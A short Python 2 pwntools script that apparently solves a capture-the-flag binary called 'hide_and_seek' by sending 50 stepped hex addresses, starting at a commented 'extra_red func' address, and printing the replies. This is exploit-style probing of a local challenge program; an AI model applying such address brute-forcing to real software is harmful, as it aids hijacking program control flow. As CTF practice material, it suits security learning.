from pwn import *

# extra_red func
addr = 0x80487cb

p = process('./hide_and_seek')

print p.recvline(timeout=5)
print p.recvline(timeout=5)

for _ in range(50):
    p.sendline(hex(addr))

    print p.recvline(timeout=5)
    print p.recvline(timeout=5)

    addr += 0x2

print p.recvline(timeout=5)
p.close()
